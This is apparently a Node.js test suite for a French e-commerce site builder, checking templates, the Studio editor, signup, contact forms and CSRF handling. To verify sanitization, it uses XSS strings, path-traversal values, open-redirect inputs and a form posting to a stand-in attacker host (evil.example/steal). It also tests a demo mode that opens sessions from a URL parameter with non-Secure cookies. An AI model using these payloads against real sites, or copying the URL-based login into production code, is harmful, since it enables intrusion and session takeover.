/* Templates « site complet » (site1…site16) : catalogue, assets, choix par le marchand,
   brouillon puis publication, rendu de la vitrine, inscription depuis la galerie. */
const { test, before, after } = require("node:test")
const assert = require("node:assert")
const fs = require("node:fs")
const os = require("node:os")
const path = require("node:path")
const { startServer } = require("./boot")

const DB = path.join(os.tmpdir(), `novadz-sites-${Date.now()}.db`)
let BASE = "", server
const jar = new Map()
const cookieHeader = () => [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ")
async function req(p, opts = {}) {
  const res = await fetch(BASE + p, { ...opts, headers: { ...(opts.headers || {}), cookie: cookieHeader() }, redirect: "manual" })
  for (const c of (res.headers.getSetCookie ? res.headers.getSetCookie() : [])) {
    const [pair] = c.split(";"); const i = pair.indexOf("=")
    jar.set(pair.slice(0, i), pair.slice(i + 1))
  }
  return { status: res.status, text: await res.text(), location: res.headers.get("location") || "" }
}
const form = (obj) => ({ method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(obj).toString() })
const json = (obj) => ({ method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(obj) })

before(async () => {
  try { fs.unlinkSync(DB) } catch (_) {}
  const s = await startServer({ db: DB }); server = s.child; BASE = s.base
})
after(() => { if (server) server.kill(); try { fs.unlinkSync(DB) } catch (_) {} })

test("catalogue : 16 templates, chacun a son HTML, sa capture et des assets présents", () => {
  const S = require("../src/site-templates")
  assert.equal(S.LIST.length, 16)
  for (const t of S.LIST) {
    const html = path.join(__dirname, "..", "public", "templates", t.id + ".html")
    assert.ok(fs.existsSync(html), "html manquant " + t.id)
    assert.ok(fs.existsSync(path.join(__dirname, "..", "public", "shots", t.id + ".jpg")), "capture manquante " + t.id)
    const src = fs.readFileSync(html, "utf8")
    assert.ok(src.length < 2_000_000, t.id + " trop lourd : les images doivent être des fichiers")
    for (const m of src.matchAll(/\/templates\/(site\d+)\/a\/([\w.-]+)/g)) {
      assert.ok(fs.existsSync(path.join(__dirname, "..", "public", "templates", m[1], "a", m[2])), "asset manquant " + m[0])
    }
  }
  assert.ok(!S.isSite("../etc/passwd") && !S.isSite("site17") && S.isSite("site9"))

  /* les deux catalogues sont disjoints : 11 e-commerce, 5 vitrines */
  assert.deepEqual(S.forStore({ site_kind: "vitrine" }).map((t) => t.id), ["site3", "site4", "site5", "site8", "site16"])
  assert.equal(S.forStore({ site_kind: "commerce" }).length, 11)
  assert.ok(S.forStore({ site_kind: "commerce" }).every((t) => t.kind === "boutique"))
  assert.equal(S.storeKindForSite("site5"), "vitrine")
  assert.equal(S.storeKindForSite("site11"), "commerce")
  assert.ok(!S.isSiteForStore("site5", { site_kind: "commerce" }))
  assert.ok(!S.isSiteForStore("site11", { site_kind: "vitrine" }))

  const SEC = require("../src/sections")
  assert.equal(SEC.sanitizeDesign({ siteTemplate: "site11" }, { site_kind: "commerce" }).siteTemplate, "site11")
  assert.equal(SEC.sanitizeDesign({ siteTemplate: "site5" }, { site_kind: "commerce" }).siteTemplate, "")
  assert.equal(SEC.sanitizeDesign({ siteTemplate: "site5" }, { site_kind: "vitrine" }).siteTemplate, "site5")
  assert.equal(SEC.sanitizeDesign({ siteTemplate: "site11" }, { site_kind: "vitrine" }).siteTemplate, "")
})

test("rendu : boutique = produits/panier, vitrine = contact, aucun mélange", () => {
  const S = require("../src/site-templates")
  const product = [{ id: 7, title: "T\"><img src=x>", price_cents: 1000, image: "" }]
  for (const t of S.LIST) {
    const kind = S.storeKindForSite(t.id)
    const store = { slug: "x", name: "A<script>1</script>", site_kind: kind, phone: "0555 12 34 56" }
    const h = S.render(store, product, t.id, { cartCount: 3, contactSent: true })
    assert.ok(h.includes("A&lt;script&gt;1&lt;/script&gt;"), t.id)
    assert.ok(!h.includes("<img src=x>"), t.id)

    if (t.kind === "boutique") {
      assert.equal((h.match(/id="ndz-boutique"/g) || []).length, 1, t.id)
      assert.ok(h.includes("/x/cart") && h.includes("Panier (3)") && h.includes("/x/checkout"), t.id)
      assert.ok(!h.includes('id="ndz-vitrine"'), t.id)
    } else {
      assert.equal((h.match(/id="ndz-vitrine"/g) || []).length, 1, t.id)
      assert.ok(h.includes('action="/x/contact"') && h.includes('id="ecrire"') && h.includes("Message reçu"), t.id)
      assert.ok(h.includes('href="tel:0555123456"'), t.id)
      assert.ok(!h.includes('id="ndz-boutique"') && !h.includes("/x/cart") && !h.includes("/x/checkout"), t.id)
    }

    const otherKind = kind === "vitrine" ? "commerce" : "vitrine"
    assert.equal(S.render({ ...store, site_kind: otherKind }, product, t.id), "", t.id + " refusé pour " + otherKind)
  }
})

test("marchand : choisir un template = brouillon, puis Publier = vitrine", async () => {
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  const themes = await req("/dashboard/design/themes")
  assert.match(themes.text, /Templates e-commerce complets/)
  assert.match(themes.text, /\/shots\/site11\.jpg/)
  assert.ok(!themes.text.includes("/shots/site16.jpg"), "aucun template vitrine dans une boutique")
  assert.ok(!themes.text.includes("/shots/site5.jpg"), "aucun template vitrine dans une boutique")

  const bad = await req("/dashboard/design/site-template", form({ id: "../../x" }))
  assert.match(bad.location, /design\/themes/)

  const wrongKind = await req("/dashboard/design/site-template", form({ id: "site5" }))
  assert.match(wrongKind.location, /design\/themes/)
  assert.ok(!(await req("/amina-mode?preview=1")).text.includes("ndz-vitrine"), "template vitrine refusé côté serveur")

  const pick = await req("/dashboard/design/site-template", form({ id: "site11" }))
  assert.equal(pick.status, 302)

  let shop = await req("/amina-mode")
  assert.ok(!shop.text.includes("ndz-boutique"), "pas visible avant Publier")
  const prev = await req("/amina-mode?preview=1")
  assert.ok(prev.text.includes("ndz-boutique"), "l'aperçu du brouillon montre le template")

  const pub = await req("/dashboard/design/publish", { method: "POST" })
  assert.equal(pub.status, 200)
  shop = await req("/amina-mode")
  assert.ok(shop.text.includes("ndz-boutique") && shop.text.includes("/amina-mode/checkout"))

  /* l'enregistrement de l'éditeur ne doit pas effacer le choix */
  await req("/dashboard/design/save", json({ design: { showNovadz: true } }))
  await req("/dashboard/design/publish", { method: "POST" })
  shop = await req("/amina-mode")
  assert.ok(shop.text.includes("ndz-boutique"), "template conservé après sauvegarde éditeur")

  /* la recherche et le reste de la boutique gardent le thème Nova */
  const search = await req("/amina-mode?q=a")
  assert.ok(!search.text.includes("ndz-boutique"))
  assert.equal((await req("/amina-mode/cart")).status, 200)

  /* retour à un thème classique */
  await req("/dashboard/design/site-template", form({ id: "" }))
  await req("/dashboard/design/publish", { method: "POST" })
  assert.ok(!(await req("/amina-mode")).text.includes("ndz-boutique"))

  /* même en forgeant la sauvegarde de l'éditeur, un template vitrine ne passe pas */
  await req("/dashboard/design/save", json({ design: { siteTemplate: "site5" } }))
  await req("/dashboard/design/publish", { method: "POST" })
  shop = await req("/amina-mode")
  assert.ok(!shop.text.includes("ndz-vitrine") && !shop.text.includes("ndz-boutique"))
})

test("marchand vitrine : seuls les templates vitrine, contact sans panier", async () => {
  jar.clear()
  await req("/login", form({ email: "vitrine@novadz.dz", password: "demo1234" }))
  const themes = await req("/dashboard/design/themes")
  assert.match(themes.text, /Templates vitrine complets/)
  assert.match(themes.text, /\/shots\/site5\.jpg/)
  assert.match(themes.text, /\/shots\/site16\.jpg/)
  assert.ok(!themes.text.includes("/shots/site11.jpg"), "aucun template e-commerce dans une vitrine")
  assert.ok(!themes.text.includes("/shots/site1.jpg"), "aucun template e-commerce dans une vitrine")

  const wrongKind = await req("/dashboard/design/site-template", form({ id: "site11" }))
  assert.match(wrongKind.location, /design\/themes/)
  assert.ok(!(await req("/atelier-lina?preview=1")).text.includes("ndz-boutique"), "template e-commerce refusé côté serveur")

  const pick = await req("/dashboard/design/site-template", form({ id: "site5" }))
  assert.equal(pick.status, 302)
  const prev = await req("/atelier-lina?preview=1")
  assert.ok(prev.text.includes("ndz-vitrine") && prev.text.includes("/atelier-lina/contact"))
  assert.ok(!prev.text.includes("ndz-boutique") && !prev.text.includes("/atelier-lina/cart") && !prev.text.includes("/atelier-lina/checkout"))

  await req("/dashboard/design/publish", { method: "POST" })
  const pub = await req("/atelier-lina")
  assert.ok(pub.text.includes("ndz-vitrine") && pub.text.includes("/atelier-lina/contact"))
})

test("galerie : 6 cartes « Utiliser » (3 vitrine + 3 e-commerce) ; l'inscription ne mélange jamais les familles", async () => {
  jar.clear()
  const home = await req("/")
  assert.equal((home.text.match(/\/signup\?site=site\d+/g) || []).length, 6)
  assert.match(home.text, /site=site5(?:&amp;|&)kind=vitrine/)
  assert.match(home.text, /site=site1(?:&amp;|&)kind=commerce/)
  assert.equal((await req("/themes")).status, 200)

  const su = await req("/signup?site=site5")
  assert.match(su.text, /name="site" value="site5"/)
  assert.match(su.text, /value="vitrine" checked/)
  assert.equal((su.text.match(/name="site" value="site5"/g) || []).length, 1, "le template n'est transmis que par le formulaire vitrine")

  /* type e-commerce + template vitrine : le compte est créé, le template est ignoré */
  const mismatch = await req("/signup", form({ kind: "commerce", theme: "", site: "site5", store: "Mismatch Test", name: "Test", email: "mismatch@t.dz", password: "secret1", password2: "secret1" }))
  assert.equal(mismatch.status, 302)
  assert.match(mismatch.location, /demarrer/)
  const mismatchPrev = await req("/mismatch-test?preview=1")
  /* le modèle vitrine est refusé ; la boutique neuve part en revanche sur un
     modèle e-commerce (c'est lui qui ouvre le Studio), donc ndz-boutique peut
     être là : ce n'est pas un mélange de familles. */
  assert.ok(!mismatchPrev.text.includes("ndz-vitrine"), "le modèle vitrine est refusé")
  assert.ok(mismatchPrev.text.includes("ndz-boutique"), "une boutique neuve démarre sur un modèle complet")

  /* type vitrine + template vitrine : brouillon prêt, formulaire branché aux reçus */
  const out = await req("/signup", form({ kind: "vitrine", theme: "", site: "site5", store: "Ma Vitrine Test", name: "Test", email: "v@t.dz", password: "secret1", password2: "secret1" }))
  assert.equal(out.status, 302)
  assert.match(out.location, /dashboard\/studio/)
  const prev = await req("/ma-vitrine-test?preview=1")
  assert.ok(prev.text.includes("ndz-vitrine") && prev.text.includes("/ma-vitrine-test/contact"))
  assert.ok(!prev.text.includes("ndz-boutique") && !prev.text.includes("/ma-vitrine-test/checkout"))

  await req("/dashboard/design/publish", { method: "POST" })
  const sent = await req("/ma-vitrine-test/contact", form({
    name: "Client Test", phone: "0555 12 34 56", email: "",
    message: "Bonjour, je veux un devis.", website: "", back: "",
  }))
  assert.match(sent.location, /envoye=1/)
  assert.ok((await req("/ma-vitrine-test?envoye=1")).text.includes("Message reçu"))
  assert.ok((await req("/dashboard/recus")).text.includes("Bonjour, je veux un devis."))
})

/* ------------------------- studio (édition visuelle) ------------------------- */
test("studio : brouillon, publication, assainissement, CSP, isolation", async () => {
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  await req("/dashboard/design/site-template", form({ id: "site11" }))
  const studio = await req("/dashboard/studio/pages")
  assert.equal(studio.status, 200)
  assert.match(studio.text, /_studio\/studio\.js/)

  const frame = await req("/dashboard/studio/frame")
  assert.match(frame.text, /_studio\/frame\.js/)
  assert.match(frame.text, /data-ndz="produits"/)

  const evil = '<!doctype html><html><head><title>t</title><script>alert(1)</script></head><body><h1 onclick="x()">STUDIO-MARK</h1><a href="javascript:alert(1)">l</a><iframe src="//e"></iframe><div data-ndz="produits"></div></body></html>'
  const save = await req("/dashboard/studio/save", json({ html: evil }))
  assert.equal(JSON.parse(save.text).ok, true)
  assert.equal(JSON.parse((await req("/dashboard/studio/save", json({ html: "pas du html" }))).text).ok, false)

  await req("/dashboard/studio/publish", { method: "POST" }).then((r) => assert.equal(JSON.parse(r.text).ok, true))
  const live = await fetch(BASE + "/amina-mode")
  const html = await live.text()
  const csp = live.headers.get("content-security-policy")
  assert.match(csp, /script-src 'self'(;|$)/)
  assert.ok(!/script-src[^;]*unsafe-inline/.test(csp), "aucun script inline autorisé")
  assert.ok(html.includes("STUDIO-MARK") && html.includes("ndz-boutique"))
  assert.ok(!/alert\(1\)|onclick|<iframe|javascript:/i.test(html), "code actif retiré")

  /* brouillon plus récent : invisible au public, visible en aperçu propriétaire */
  await req("/dashboard/studio/save", json({ html: evil.replace("STUDIO-MARK", "BROUILLON-X") }))
  assert.ok(!(await (await fetch(BASE + "/amina-mode")).text()).includes("BROUILLON-X"))
  assert.ok((await req("/amina-mode?preview=1")).text.includes("BROUILLON-X"))

  /* anonyme : pas d'accès au studio */
  const anon = await fetch(BASE + "/dashboard/studio/save", { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}", redirect: "manual" })
  assert.notEqual(anon.status, 200)

  await req("/dashboard/studio/reset", { method: "POST" })
  assert.ok(!(await (await fetch(BASE + "/amina-mode")).text()).includes("STUDIO-MARK"), "retour au modèle")
})

test("studio : pages multiples, formulaire, vidéo, boutons d'achat, animations", async () => {
  jar.clear()
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  await req("/dashboard/design/site-template", form({ id: "site12" }))
  const meta = JSON.parse((await req("/dashboard/studio/meta")).text)
  assert.ok(meta.ok && meta.pages[0].key === "home" && Array.isArray(meta.products))
  const pid = meta.products[0] && meta.products[0].id
  assert.ok(pid, "le magasin de démo a des produits")

  const html = `<!doctype html><html><head><title>t</title></head><body>
    <h1 data-fx="up" data-fx-hover="lift">ACCUEIL-X</h1>
    <a href="#" data-ndz-buy="direct" data-ndz-pid="${pid}">Acheter</a>
    <div data-ndz-video="dQw4w9WgXcQ" style="position:relative"></div>
    <div data-ndz-video="x\" onload=\"1" style="position:relative"></div>
    <form data-ndz-form action="//evil.example/steal" method="get"><input name="name"><input name="message"><input name="phone"></form>
    <div data-ndz="produits"></div></body></html>`
  assert.equal(JSON.parse((await req("/dashboard/studio/save", json({ html }))).text).ok, true)

  /* nouvelle page = copie, avec son propre contenu */
  const np = JSON.parse((await req("/dashboard/studio/page", json({ name: "À propos", from: "home" }))).text)
  assert.ok(np.ok && np.key === "a-propos", JSON.stringify(np))
  await req("/dashboard/studio/save", json({ html: html.replace("ACCUEIL-X", "APROPOS-X"), page: "a-propos" }))
  assert.equal(JSON.parse((await req("/dashboard/studio/page", json({ name: "", from: "home" }))).text).ok, false)
  await req("/dashboard/studio/publish", { method: "POST" })

  const home = await fetch(BASE + "/amina-mode"), h = await home.text()
  assert.ok(h.includes("ACCUEIL-X") && !h.includes("APROPOS-X"))
  assert.match(home.headers.get("content-security-policy"), /script-src 'self'/)
  assert.ok(h.includes('src="/_studio/fx.js"') && h.includes("/_studio/fx.css"))
  assert.ok(h.includes(`href="/amina-mode/p/${pid}"`), "bouton d'achat : repli vers la fiche produit")
  assert.ok(h.includes("youtube-nocookie.com/embed/dQw4w9WgXcQ"), "vidéo valide")
  assert.equal((h.match(/<iframe/g) || []).length, 1, "une seule iframe : l'identifiant piégé est ignoré")
  assert.ok(h.includes('action="/amina-mode/s-form"') && !h.includes("evil.example"), "formulaire : adresse d'envoi imposée")

  const sub = await fetch(BASE + "/amina-mode/s/a-propos")
  assert.equal(sub.status, 200)
  const sh = await sub.text()
  assert.ok(sh.includes("APROPOS-X") && !sh.includes("ACCUEIL-X"))
  assert.ok(sh.includes('name="back" value="a-propos"'))
  assert.equal((await fetch(BASE + "/amina-mode/s/inconnue")).status, 404)

  /* formulaire : message dans la boîte de réception, anti-spam (pot de miel) */
  const post = (b) => fetch(BASE + "/amina-mode/s-form", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(b).toString(), redirect: "manual" })
  const ok = await post({ name: "Karim", phone: "0555123456", message: "Bonjour test", back: "a-propos" })
  assert.equal(ok.headers.get("location"), "/amina-mode/s/a-propos?sent=1")
  const bot = await post({ name: "Bot", phone: "0555", message: "spam", website: "x" })
  assert.equal(bot.headers.get("location"), "/amina-mode")
  const bad = await post({ name: "K", message: "x" })
  assert.match(bad.headers.get("location"), /sent=0/)

  /* suppression : la page disparaît, l'accueil reste */
  assert.equal(JSON.parse((await req("/dashboard/studio/page/delete", json({ key: "a-propos" }))).text).ok, true)
  assert.equal((await fetch(BASE + "/amina-mode/s/a-propos")).status, 404)
  assert.equal(JSON.parse((await req("/dashboard/studio/page/delete", json({ key: "home" }))).text).ok, false)
})

/* ---- templates importés : scripts du template, pages du template, taille ---- */
const TPL = path.join(__dirname, "..", "public", "templates")
const FIX = "zz-fixture"
let catBackup = null
function fixtureUp() {
  const cat = path.join(TPL, "catalog.json")
  catBackup = fs.existsSync(cat) ? fs.readFileSync(cat, "utf8") : null
  const list = catBackup ? JSON.parse(catBackup) : []
  fs.writeFileSync(cat, JSON.stringify(list.concat([{ id: FIX, name: "Fixture", niche: "t", line: "t", kind: "commerce" }])))
  fs.mkdirSync(path.join(TPL, FIX, "js"), { recursive: true }); fs.mkdirSync(path.join(TPL, FIX, "pages"), { recursive: true })
  fs.writeFileSync(path.join(TPL, FIX, "js", "a.js"), "window.__fix=1")
  fs.writeFileSync(path.join(TPL, FIX, "manifest.json"), JSON.stringify({ pages: [{ key: "about", name: "A propos" }] }))
  fs.writeFileSync(path.join(TPL, FIX, "pages", "about.html"), '<!doctype html><html><head><title>x</title></head><body><h1>ABOUT-TPL</h1><a href="/__ndz__">retour</a></body></html>')
  fs.writeFileSync(path.join(TPL, FIX + ".html"), `<!doctype html><html><head><title>x</title><script defer src="/templates/${FIX}/js/a.js"></script></head><body><h1>HOME-TPL</h1><a href="/__ndz__/s/about">a</a></body></html>`)
}
function fixtureDown() {
  fs.rmSync(path.join(TPL, FIX), { recursive: true, force: true }); fs.rmSync(path.join(TPL, FIX + ".html"), { force: true })
  const cat = path.join(TPL, "catalog.json")
  catBackup === null ? fs.rmSync(cat, { force: true }) : fs.writeFileSync(cat, catBackup)
}
after(fixtureDown)

test("template importé : scripts du template seulement, pages du template, liens reliés, limite 6 Mo", async () => {
  fixtureUp()
  jar.clear()
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  assert.equal((await req("/dashboard/design/site-template", form({ id: FIX }))).status, 302)

  const meta = JSON.parse((await req("/dashboard/studio/meta")).text)
  assert.deepEqual(meta.pages.map((p) => p.key), ["home", "about"], "les pages du template apparaissent")

  /* éditeur : scripts en pause (sinon ils casseraient la sélection) */
  const frame = (await req("/dashboard/studio/frame")).text
  assert.ok(frame.includes('type="text/ndz-off"') && !frame.includes(`<script defer src="/templates/${FIX}`))
  const frame2 = (await req("/dashboard/studio/frame?page=about")).text
  assert.ok(frame2.includes("ABOUT-TPL"))

  /* l'enregistrement remet le script du template, mais refuse tout autre script */
  const doc = (inner) => `<!doctype html><html><head><title>t</title>${inner}</head><body><h1>MARK-1</h1></body></html>`
  const good = `<script type="text/ndz-off" data-ndz-src="/templates/${FIX}/js/a.js"></script>`
  const attacks = [
    `<script type="text/ndz-off" data-ndz-src="/templates/${FIX}/js/absent.js"></script>`,
    `<script type="text/ndz-off" data-ndz-src="/templates/${FIX}/js/../../../server.js"></script>`,
    `<script type="text/ndz-off" data-ndz-src="https://evil.example/x.js"></script>`,
    `<script src="/templates/${FIX}/js/a.js"></script>`,
    `<script>alert(1)</script>`,
  ]
  await req("/dashboard/studio/save", json({ html: doc(good + attacks.join("")) }))
  await req("/dashboard/studio/publish", { method: "POST" })
  const home = (await (await fetch(BASE + "/amina-mode")).text())
  assert.equal((home.match(/<script[^>]*templates\/zz-fixture\/js\/a\.js/g) || []).length, 1, "script du template conservé une seule fois")
  assert.ok(!/absent\.js|evil\.example|server\.js|alert\(1\)|ndz-off/.test(home), "scripts non autorisés retirés")

  /* page du template servie telle quelle, liens reliés à la boutique */
  const about = await (await fetch(BASE + "/amina-mode/s/about")).text()
  assert.ok(about.includes("ABOUT-TPL") && about.includes('href="/amina-mode"'))

  /* taille : 5 Mo passent, 7 Mo non */
  const big = (n) => doc("") .replace("</body>", "<p>" + "x".repeat(n) + "</p></body>")
  assert.equal(JSON.parse((await req("/dashboard/studio/save", json({ html: big(5 * 1024 * 1024) }))).text).ok, true)
  const tooBig = await req("/dashboard/studio/save", json({ html: big(7 * 1024 * 1024) }))
  assert.equal(JSON.parse(tooBig.text).ok, false)

  await req("/dashboard/studio/reset", { method: "POST" })
  await req("/dashboard/design/site-template", form({ id: "" }))
})

/* Le Studio sert les deux familles : une vitrine garde le formulaire de contact,
   sans produits ni panier. Les photos déjà envoyées sont proposées pour être
   réutilisées (bibliothèque) au lieu d'être renvoyées. */
test("studio vitrine : contact sans panier, et bibliothèque d'images", async () => {
  jar.clear()
  assert.equal((await req("/login", form({ email: "vitrine@novadz.dz", password: "demo1234" }))).status, 302)
  const pick = await req("/dashboard/design/site-template", form({ id: "site5" }))
  assert.match(pick.location, /dashboard\/studio/)

  const frame = (await req("/dashboard/studio/frame")).text
  assert.ok(frame.includes('id="ndz-vitrine"'), "formulaire de contact présent")
  assert.ok(frame.includes('action="/atelier-lina/contact"'), "le message part vers la boîte de réception")
  assert.ok(!frame.includes('id="ndz-boutique"') && !frame.includes("/atelier-lina/cart"), "aucun produit ni panier")
  assert.ok(frame.includes("/_studio/frame.js"), "le studio pilote la page")

  const meta = JSON.parse((await req("/dashboard/studio/meta")).text)
  assert.ok(Array.isArray(meta.images), "bibliothèque d'images exposée")
  assert.ok(meta.images.every((u) => /^\/(uploads|demo)\/[\w.-]+$/.test(u)), "uniquement des images servies par la plateforme")
})

/* Raccourci de démonstration : il n'existe qu'en mode démo (les tests tournent
   avec NOVADZ_DEMO=1) et ne renvoie que vers un écran interne. */
test("raccourci démo : ouvre le studio vitrine, refuse une redirection externe", async () => {
  jar.clear()
  const r = await req("/demo-login/vitrine?next=/dashboard/studio")
  assert.equal(r.status, 302)
  assert.match(r.location, /^\/dashboard\/studio(\?|$)/)
  assert.equal((await req("/dashboard/studio/atelier")).status, 200, "session ouverte par le raccourci")

  jar.clear()
  const evil = await req("/demo-login/marchand?next=//evil.example/x")
  assert.equal(evil.status, 302)
  assert.match(evil.location, /^\/dashboard(\?|$)/, "pas de redirection vers un autre site")
  assert.equal((await req("/demo-login/inconnu")).status, 404)
})

/* Le formulaire de contact d'une vitrine est ajouté au rendu, pas dans la page
   enregistrée : sinon il serait sauvegardé par le Studio puis ajouté une
   seconde fois (doublon visible sur le site publié). */
test("studio vitrine : enregistrer ne duplique pas le formulaire de contact", () => {
  const S = require("../src/site-templates")
  const store = { slug: "x", name: "Atelier", site_kind: "vitrine", phone: "0555 12 34 56" }
  const edit = S.render(store, [], "site5", { studio: true, auto: true })
  assert.equal((edit.match(/id="ndz-vitrine"/g) || []).length, 1, "aperçu unique dans le studio")
  assert.ok(edit.includes('data-studio-ui="apercu-contact"'), "bloc marqué comme aperçu")

  /* ce que fait frame.js à l'enregistrement : on retire les blocs d'interface */
  const saved = edit.replace(/<section data-studio-ui="apercu-contact">[\s\S]*?<\/section>/g, "")
  assert.ok(!saved.includes('id="ndz-vitrine"'), "rien du formulaire n'est enregistré")

  const pub = S.render(store, [], "site5", { html: saved })
  assert.equal((pub.match(/id="ndz-vitrine"/g) || []).length, 1, "un seul formulaire sur le site publié")
})

/* Derrière un proxy qui annonce https tout en servant du http, un cookie
   « Secure » est rejeté par le navigateur : la session serait perdue à chaque
   requête (boucle sur /login). En mode démo, on ne l'impose donc pas. */
test("démo : le cookie de session n'est pas Secure, et /demo-status explique l'état", async () => {
  const r = await fetch(BASE + "/demo-login/vitrine?next=/dashboard/studio", {
    headers: { "x-forwarded-proto": "https" }, redirect: "manual",
  })
  const cookie = (r.headers.getSetCookie ? r.headers.getSetCookie() : []).join(" ; ")
  assert.ok(cookie.includes("sid="), "cookie posé")
  assert.equal((cookie.match(/sid=/g) || []).length, 1, "un seul cookie sid par réponse")
  assert.ok(!/;\s*Secure/i.test(cookie), "pas de Secure en mode démo")

  /* on rejoue la même requête en gardant le cookie reçu */
  jar.clear()
  const sid = (cookie.match(/sid=([^;]+)/) || [])[1]
  jar.set("sid", sid)
  const st = JSON.parse((await req("/demo-status")).text)
  assert.equal(st.mode, "demo")
  assert.equal(st.loggedAs, "vitrine@novadz.dz", "session reconnue")
  assert.equal(st.sessionFound, true)
})

/* Aperçu distant : si le proxy perd le cookie, « ?as=vitrine » doit rouvrir la
   session au lieu de renvoyer vers /login. */
test("démo : ?as=vitrine ouvre la session même sans cookie", async () => {
  jar.clear()
  const direct = await req("/dashboard/studio")
  assert.equal(direct.status, 302, "sans session : renvoi vers la connexion")
  assert.match(direct.location, /login/)

  jar.clear()
  const lifted = await req("/dashboard/studio/pages?as=vitrine")
  assert.equal(lifted.status, 200, "la session est recréée par l'URL")
  assert.match(lifted.text, /data-slug="atelier-lina"/)
})

test("démo : ?as= inconnu ne connecte personne", async () => {
  jar.clear()
  const r = await req("/dashboard/studio?as=root")
  assert.equal(r.status, 302)
  assert.match(r.location, /login/)
})

/* Derrière un proxy d'aperçu, l'Origin du navigateur et l'en-tête Host ne
   diffèrent parfois que par le port (ou Host est réécrit). Les POST doivent
   passer ; un vrai site étranger reste refusé. */
test("anti-CSRF : port et hôte de proxy tolérés, origine étrangère refusée", async () => {
  jar.clear()
  await req("/dashboard/studio?as=vitrine")
  const base = new URL(BASE)
  const post = (origin, extra = {}) => fetch(BASE + "/dashboard/studio/save", {
    method: "POST",
    headers: { "Content-Type": "application/json", origin, cookie: cookieHeader(), ...extra },
    body: JSON.stringify({ html: "", page: "home" }),
  })

  /* même nom d'hôte, port différent : accepté (on arrive au contrôle du contenu) */
  assert.notEqual((await post(base.origin.replace(/:\d+$/, ":9999"))).status, 403)
  /* hôte réécrit par le proxy, Origin d'origine dans x-forwarded-host : accepté */
  assert.notEqual((await post(base.origin, { "x-forwarded-host": base.host })).status, 403)
  /* origine étrangère : refusée */
  assert.equal((await post("https://evil.example")).status, 403)
})

/* Dans une boutique, la grille « Nos produits » est dessinée à partir de la
   base : le Studio doit pouvoir changer le nom et le prix sans sortir de
   l'éditeur (avant, cliquer un prix ne faisait rien). */
test("studio : nom et prix d'un produit modifiables depuis l'éditeur", async () => {
  jar.clear()
  await req("/login", form({ email: "demo@novadz.dz", password: "demo1234" }))
  await req("/dashboard/design/site-template", form({ id: "site11" }))

  const meta = JSON.parse((await req("/dashboard/studio/meta")).text)
  const p = (meta.products || [])[0]
  assert.ok(p && p.id, "la boutique de démonstration a des produits")

  /* la page éditable porte de quoi retrouver le produit et son prix */
  const frame = await req("/dashboard/studio/frame")
  assert.match(frame.text, /data-ndz-produit="/)
  assert.match(frame.text, /data-prix="/)

  const ok = JSON.parse((await req("/dashboard/studio/produit", json({ id: p.id, titre: "Nom depuis le Studio", prix: "1234,50" }))).text)
  assert.equal(ok.ok, true)
  assert.equal(ok.prix, 123450)
  assert.match(ok.prixTxt, /1\s*234,50\s*DZD/)

  const apres = await req("/dashboard/studio/frame")
  assert.match(apres.text, /Nom depuis le Studio/, "la page éditable reprend le nouveau nom")
  assert.match(apres.text, /1\s*234,50/, "et le nouveau prix")

  /* refus : prix qui n'est pas un nombre, nom vide, produit d'une autre boutique */
  assert.equal(JSON.parse((await req("/dashboard/studio/produit", json({ id: p.id, titre: "Nom valable", prix: "abc" }))).text).ok, false)
  assert.equal(JSON.parse((await req("/dashboard/studio/produit", json({ id: p.id, titre: " ", prix: "10" }))).text).ok, false)
  assert.equal((await req("/dashboard/studio/produit", json({ id: 999999, titre: "Nom valable", prix: "10" }))).status, 404)

  /* sans session : rien ne passe */
  const anon = await fetch(BASE + "/dashboard/studio/produit", {
    method: "POST", headers: { "Content-Type": "application/json" }, redirect: "manual",
    body: JSON.stringify({ id: p.id, titre: "Pirate", prix: "1" }),
  })
  assert.notEqual(anon.status, 200)

  await req("/dashboard/studio/reset", { method: "POST" })
})
